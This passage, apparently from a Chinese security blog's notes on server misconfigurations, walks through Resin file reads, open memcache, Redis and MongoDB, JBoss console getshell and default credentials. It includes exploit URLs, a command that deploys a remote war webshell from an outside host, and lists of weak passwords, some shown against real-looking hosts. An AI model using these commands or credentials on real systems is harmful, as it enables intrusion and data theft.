+&lt;p&gt;zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。&lt;/p&gt;
+
+&lt;p&gt;在wooyun上所见到的案例中，最令人头疼的也最难理解的是：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;wooyun-2013-019917 反弹获取shell&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;wooyun-2013-019917
+边界神器py版开启socks代理&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;（zone.wooyun.org/content/1693）&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;wooyun-2013-019917
+端口转发（将代理端口转发到公网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;22-resin任意文件读取&quot;&gt;22 Resin任意文件读取&lt;/h1&gt;
+
+&lt;h2 id=&quot;221-基本知识&quot;&gt;22.1 基本知识&lt;/h2&gt;
+
+&lt;p&gt;Resin：java应用服务器&lt;/p&gt;
+
+&lt;p&gt;CAUCHO公司产品，是一个非常流行的application server
+，对server和JSP提供良好的支持，速度非常快直逼APACHE
+SERVER。Resin支持负载均衡，可以增加web站点的可靠性。&lt;/p&gt;
+
+&lt;h2 id=&quot;222-漏洞利用&quot;&gt;22.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;任意文件读取：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;配置文件：&lt;/p&gt;
+
+&lt;p&gt;http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml&lt;/p&gt;
+
+&lt;p&gt;读取源码：&lt;/p&gt;
+
+&lt;p&gt;http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp&lt;/p&gt;
+
+&lt;p&gt;读取password.xml&lt;/p&gt;
+
+&lt;p&gt;ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;resin文件包含漏洞shell (wooyun-2013-023139)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;http://ip/Resin-doc/viewfile/?contextpath=C:\&amp;amp;servletpath=&amp;amp;file=boot.ini&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;resin弱口令&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;http://ip/resin-admin/status.php admin / admin&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;resin版本过低，导致磁盘信息泄露&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://ip/c:/&quot;&gt;http://ip/c:/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;223-实例演练&quot;&gt;22.3 实例演练&lt;/h2&gt;
+
+&lt;p&gt;http://www.xx.cn/c:/ （wooyun-2013-041338）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_c53a22d32c38834b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_6a5593fbd445e703.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;23-memcache未限制访问ip&quot;&gt;23 memcache未限制访问IP&lt;/h1&gt;
+
+&lt;h2 id=&quot;231-基础知识&quot;&gt;23.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。&lt;/p&gt;
+
+&lt;h2 id=&quot;232-漏洞利用&quot;&gt;23.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;Memcached未限制IP导致cache泄露
+服务默认端口：11211&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;使用nc 反弹查看数据：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;nc.exe –vv ip 11211&lt;/p&gt;
+
+&lt;p&gt;ip: inverse host lookup failed: h_errno 11004: NO_DATA&lt;/p&gt;
+
+&lt;p&gt;(UNKNOWN) [ip] 11211 (?) open&lt;/p&gt;
+
+&lt;p&gt;stats items&lt;/p&gt;
+
+&lt;p&gt;STAT items:4:number 1544729&lt;/p&gt;
+
+&lt;p&gt;…….&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;memcached空口令访问 可以直接telnet登陆
+wooyun-2010-0123604&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;root@kali:~# nc ip 11211&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;233-实战演练&quot;&gt;23.3 实战演练&lt;/h2&gt;
+
+&lt;p&gt;root@Aerfa:~# nc -vv xx.xx.xx.xx 11211&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_ba1df478b9b7aee9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;root@Aerfa:~# nc -vv yy.yy.yy.yy 11211&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_df926128a0be01ea.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;24-jboss配置不当&quot;&gt;24 Jboss配置不当&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/papers/178&lt;/p&gt;
+
+&lt;h2 id=&quot;241-基本信息&quot;&gt;24.1 基本信息&lt;/h2&gt;
+
+&lt;p&gt;Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。&lt;/p&gt;
+
+&lt;p&gt;Jboss应用服务框架：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_7ca4d6381121d244.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;设备层（instrumentation）：定义信息模型。&lt;/p&gt;
+
+&lt;p&gt;代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。&lt;/p&gt;
+
+&lt;p&gt;分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;JMX
+Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;这些请求都是用MBean服务器发送到响应的Mbean服务&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Deployer架构：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;JAR（Java
+Archives），用于压缩、发布、部署和封装库、组件、程序插件。&lt;/p&gt;
+
+&lt;p&gt;WAR（Web
+ARchives），JAR文件包含一个Web应用程序的组件。&lt;/p&gt;
+
+&lt;h2 id=&quot;242-漏洞利用&quot;&gt;24.2 漏洞利用&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;WAR文件&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK
+jar命令创建。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;JMX Console&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;web-console&lt;/p&gt;
+
+&lt;p&gt;jmx-console&lt;/p&gt;
+
+&lt;p&gt;invoker/JMXInvokerServlet&lt;/p&gt;
+
+&lt;p&gt;JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。&lt;/p&gt;
+
+&lt;p&gt;JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。&lt;/p&gt;
+
+&lt;p&gt;Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。&lt;/p&gt;
+
+&lt;p&gt;War包的部署，执行shell命令。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Jboss弱口令&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;http://IP/admin-console admin / admin&lt;/p&gt;
+
+&lt;h2 id=&quot;243-实例应用&quot;&gt;24.3 实例应用&lt;/h2&gt;
+
+&lt;p&gt;http://yy.yy.yy.yy:8080/web-console/ 未授权访问&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_8e55e3f044ed0364.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_90d6709742b78542.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;1-admin-console-getshell&quot;&gt;&amp;lt;1&amp;gt; admin-console getshell&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://yy.yy.yy.yy/admin-console/&quot;&gt;http://yy.yy.yy.yy/admin-console/&lt;/a&gt; 无效&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_28bdb02a0cb5a373.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2-jmx-console-getshell&quot;&gt;&amp;lt;2&amp;gt; jmx-console getshell&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://yy.yy.yy.yy/jmx-console/&quot;&gt;http://yy.yy.yy.yy/jmx-console/&lt;/a&gt; 存在&lt;/p&gt;
+
+&lt;p&gt;需要将war包或jsp shell放到服务器上
+&lt;a href=&quot;http://p2j.cn/is.war&quot;&gt;http://p2j.cn/is.war&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;jboss.deployment——&amp;gt;void addURL&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_d6a528da8f01270e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_fa352df195521efa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_5acfb48291d0131b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_b4b2160d26750158.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_cc69a4e856862c50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上传成功，但是文件访问不存在&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_6201bba2e6c4598.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3-web-console-getshell&quot;&gt;&amp;lt;3&amp;gt; web-console getshell&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.xx.xx.xx/web-console/&quot;&gt;http://xx.xx.xx.xx/web-console/&lt;/a&gt; 存在&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_15bb592501eaeab4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;41-invoker-getshell&quot;&gt;&amp;lt;41&amp;gt; invoker getshell&lt;/h3&gt;
+
+&lt;p&gt;inovker接口未配置认证信息&lt;/p&gt;
+
+&lt;p&gt;yy.yy.yy.yy/invoker/JMXInvokerServlet&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_51cd584709c21a49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;案例&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-0121861&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-0121861&lt;/a&gt;中使用curl命令：&lt;/p&gt;
+
+&lt;p&gt;curl &lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-0121861&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-0121861&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_ce74e6ffdf131681.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看系统名称：&lt;/p&gt;
+
+&lt;p&gt;C:\Users\Aerfa&amp;gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSName&lt;/p&gt;
+
+&lt;p&gt;Windows 2003&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_228e2132d6117e7e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看系统版本&lt;/p&gt;
+
+&lt;p&gt;C:\Users\Aerfa&amp;gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSVersion&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_520647a32422e3a2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;远程部署war包（失败）&lt;/p&gt;
+
+&lt;p&gt;C:\Users\Aerfa&amp;gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy
+http://p2j.cn/is.war&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_f6f6157ae371b472.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&amp;amp;cmd=ls&quot;&gt;http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;amp;cmd=ls&lt;/a&gt;
+访问shell是失败&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_9f1eec4d60316f17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;25-测试机外网可访问&quot;&gt;25 测试机外网可访问&lt;/h1&gt;
+
+&lt;p&gt;测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..
+此部分不好做归纳，故略过。&lt;/p&gt;
+
+&lt;h1 id=&quot;26-padding-oracle-attack&quot;&gt;26 padding oracle attack&lt;/h1&gt;
+
+&lt;h2 id=&quot;261-基础知识&quot;&gt;26.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;Padding指数据“填充”&lt;/p&gt;
+
+&lt;p&gt;对于&lt;a href=&quot;http://baike.baidu.com/view/155969.htm&quot;&gt;加密算法&lt;/a&gt;来说，它们是基于等长的“&lt;a href=&quot;http://baike.baidu.com/view/702806.htm&quot;&gt;数据块&lt;/a&gt;”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS
+#5规则，简单地说，便是根据最后一个数据块(http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。&lt;/p&gt;
+
+&lt;h2 id=&quot;262-漏洞利用&quot;&gt;26.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;略过，乌云上有案例。&lt;/p&gt;
+
+&lt;h1 id=&quot;27-tomcat弱口令&quot;&gt;27 tomcat弱口令&lt;/h1&gt;
+
+&lt;h2 id=&quot;271-基础知识&quot;&gt;27.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;不再提及。&lt;/p&gt;
+
+&lt;h2 id=&quot;272-漏洞利用&quot;&gt;27.2 漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;弱密码：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.xxxx.com:8080/manager/html&quot;&gt;http://www.xxxx.com:8080/manager/html&lt;/a&gt; tomcat:tomcat&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.xxxx.com:8080/manager/html&quot;&gt;http://www.xxxx.com:8080/manager/html&lt;/a&gt; admin:admin&lt;/p&gt;
+
+&lt;h1 id=&quot;28-phpmyadmin弱口令&quot;&gt;28 phpmyadmin弱口令&lt;/h1&gt;
+
+&lt;p&gt;略&lt;/p&gt;
+
+&lt;h1 id=&quot;29-mongodb配置不当&quot;&gt;29 MongoDB配置不当&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/papers/850&lt;/p&gt;
+
+&lt;h2 id=&quot;291-基本介绍&quot;&gt;29.1 基本介绍&lt;/h2&gt;
+
+&lt;p&gt;略&lt;/p&gt;
+
+&lt;h2 id=&quot;292-未授权访问&quot;&gt;29.2 未授权访问&lt;/h2&gt;
+
+&lt;p&gt;默认数据库 admin&lt;/p&gt;
+
+&lt;p&gt;用户密码和密码均为空&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_af31540eed427f60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;293-实战演练&quot;&gt;29.3 实战演练&lt;/h2&gt;
+
+&lt;p&gt;yy.yy.yy.yy:27017
+博苑家_幼儿园教育信息化平台&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_933d6e56d127adb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;30-各种敏感后台对外开放&quot;&gt;30 各种敏感后台对外开放&lt;/h1&gt;
+
+&lt;p&gt;一般“奇葩”端口web访问可见。&lt;/p&gt;
+
+&lt;h1 id=&quot;31-django配置不当致信息泄露&quot;&gt;31 Django配置不当致信息泄露&lt;/h1&gt;
+
+&lt;p&gt;Django设置debug = True
+，将报错信息返回至浏览页面，从而导致信息泄露&lt;/p&gt;
+
+&lt;h1 id=&quot;32-redis未授权访问&quot;&gt;32 Redis未授权访问&lt;/h1&gt;
+
+&lt;p&gt;Port: 6379&lt;/p&gt;
+
+&lt;p&gt;一般不需要认证，可直接访问&lt;/p&gt;
+
+&lt;h2 id=&quot;321-基础知识&quot;&gt;32.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。&lt;/p&gt;
+
+&lt;p&gt;和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。&lt;/p&gt;
+
+&lt;p&gt;其中RDB就像数据库备份文件&lt;/p&gt;
+
+&lt;p&gt;AOF则是一个log日志文件&lt;/p&gt;
+
+&lt;h2 id=&quot;322-利用方式&quot;&gt;32.2 利用方式&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Kali下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;redis-cli -h xx.com&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用软件： Redis Desktop Manager&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;利用redis未授权访问漏洞getshell【www.secpulse.com/archives/5357.html】&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;开启web服务&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;网站物理路径&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;www目录可写（root权限）&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;323-实战演练&quot;&gt;32.3 实战演练&lt;/h2&gt;
+
+&lt;p&gt;xx科技有限公司&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_83a0c3790ea4b0cf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_f0a10558018436fa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_29c9a47e91a7ef0a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;33-ldap未授权访问&quot;&gt;33 LDAP未授权访问&lt;/h1&gt;
+
+&lt;p&gt;Port: 389
+WooYun-2015-92789(http://www.wooyun.org/bugs/wooyun-2015-092789)&lt;/p&gt;
+
+&lt;h2 id=&quot;331-基础知识&quot;&gt;33.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;Lightweight Directory Access
+Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。&lt;/p&gt;
+
+&lt;h2 id=&quot;332-利用方式&quot;&gt;33.2 利用方式&lt;/h2&gt;
+
+&lt;p&gt;使用LDAP Admin进行登陆&lt;/p&gt;
+
+&lt;h2 id=&quot;333-应用实例&quot;&gt;33.3 应用实例&lt;/h2&gt;
+
+&lt;p&gt;zz.zz.zz.zz&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_63de4b8b96d21dcd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;34-smb弱口令&quot;&gt;34 SMB弱口令&lt;/h1&gt;
+
+&lt;p&gt;Port: 445&lt;/p&gt;
+
+&lt;h2 id=&quot;341-smb字典&quot;&gt;34.1 smb字典&lt;/h2&gt;
+
+&lt;h2 id=&quot;342-ms08-067溢出&quot;&gt;34.2 MS08-067溢出&lt;/h2&gt;
+
+&lt;p&gt;http://www.2cto.com/Article/201308/237265.html&lt;/p&gt;
+
+&lt;p&gt;Windows Server
+服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft
+Windows 2000 、Windows XP 、Windows
+Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。&lt;/p&gt;
+
+&lt;p&gt;Nmap 可以检测目标上是否存在该漏洞：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namp –sS –A –script=smb-check-vulns –PO zz.zz.zz.zz
+
+nmap -sS -A --script=smb-check-vulns -PO zz.zz.zz.zz
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;…….&lt;/p&gt;
+
+&lt;h1 id=&quot;35-openssl心脏出血&quot;&gt;35 openssl心脏出血&lt;/h1&gt;
+
+&lt;p&gt;Port：443&lt;/p&gt;
+
+&lt;p&gt;Kali桌面以保存python验证脚本&lt;/p&gt;
+
+&lt;p&gt;root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz&lt;/p&gt;
+
+&lt;h1 id=&quot;36-squid代理默认端口&quot;&gt;36 squid代理默认端口&lt;/h1&gt;
+
+&lt;p&gt;Port: 3128&lt;/p&gt;
+
+&lt;p&gt;若没有设置口令，则很可能直接漫游内网。&lt;/p&gt;
+
+&lt;h1 id=&quot;37-glassfish-web中间件弱口令&quot;&gt;37 GlassFish web中间件弱口令&lt;/h1&gt;
+
+&lt;p&gt;Port: 4848&lt;/p&gt;
+
+&lt;p&gt;弱口令：admin / adminadmin&lt;/p&gt;
+
+&lt;h1 id=&quot;38-php-fastcgi远程利用&quot;&gt;38 PHP FastCGI远程利用&lt;/h1&gt;
+
+&lt;p&gt;Port：9000&lt;/p&gt;
+
+&lt;p&gt;zone.wooyun.org/content/1060&lt;/p&gt;
+
+&lt;p&gt;使用nmap进行指纹识别： &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap –sV –p 9000
+–open zz.zz.zz.zz/24&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;目前遇到poc执行出现问题：invalid header
+version&lt;/p&gt;
+
+&lt;p&gt;（windows 7下未安装goland，
+kali中已安装仍然出现该问题）&lt;/p&gt;
+
+&lt;h1 id=&quot;39-elasticsearch代码执行&quot;&gt;39 elasticsearch代码执行&lt;/h1&gt;
+
+&lt;p&gt;Port: 9200&lt;/p&gt;
+
+&lt;h1 id=&quot;40-websphere-web中间件弱口令&quot;&gt;40 websphere web中间件弱口令&lt;/h1&gt;
+
+&lt;p&gt;Port: 9043&lt;/p&gt;
+
+&lt;p&gt;弱口令：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin / admin
+
+websphere / websphere
+
+system / manager
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;41-zebra路由弱密码&quot;&gt;41 zebra路由弱密码&lt;/h1&gt;
+
+&lt;p&gt;Port: 2601,2604&lt;/p&gt;
+
+&lt;p&gt;zebra / zebra&lt;/p&gt;
+
+&lt;h1 id=&quot;42-rundeck-web&quot;&gt;42 rundeck web&lt;/h1&gt;
+
+&lt;p&gt;Port：4440 wooyun-2015-092026&lt;/p&gt;
+
+&lt;p&gt;runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。&lt;/p&gt;
+
+&lt;p&gt;http://IP:4440 admin / admin&lt;/p&gt;
+
+&lt;p&gt;http://IP:4440/menu/home&lt;/p&gt;
+
+&lt;h1 id=&quot;43-dns未设置spf导致邮箱欺骗漏洞&quot;&gt;43 dns未设置spf导致邮箱欺骗漏洞&lt;/h1&gt;
+
+&lt;p&gt;nslookup –qt=mx baidu.com&lt;/p&gt;
+
+&lt;p&gt;nslookup –qt=txt baidu.com&lt;/p&gt;
+
+&lt;h1 id=&quot;44-cvs源码泄露&quot;&gt;44 CVS源码泄露&lt;/h1&gt;
+
+&lt;h2 id=&quot;441-基础知识&quot;&gt;44.1 基础知识&lt;/h2&gt;
+
+&lt;p&gt;略&lt;/p&gt;
+
+&lt;h2 id=&quot;442-实例应用&quot;&gt;44.2 实例应用&lt;/h2&gt;
+
+&lt;p&gt;zz集团&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://61.152.242.65/bs3q/CVS/Root&quot;&gt;http://yy.yy.yy.yy/bs3q/CVS/Root&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://61.152.242.65/cmbs/CVS/Root&quot;&gt;http://yy.yy.yy.yy/cmbs/CVS/Root&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_9f3274155b1132f6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://61.152.242.65/cmbs/CVS/Entries&quot;&gt;http://yy.yy.yy.yy/cmbs/CVS/Entries&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_41469a6a25a8a31a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;45-tomcat-examples-directory漏洞&quot;&gt;45 Tomcat examples directory漏洞&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://61.152.242.65/examples/servlets/servlet/SessionExample&quot;&gt;http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_3a3e383932a1596a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;是否存在sql post注入
+、session伪造等安全问题。&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry></feed>
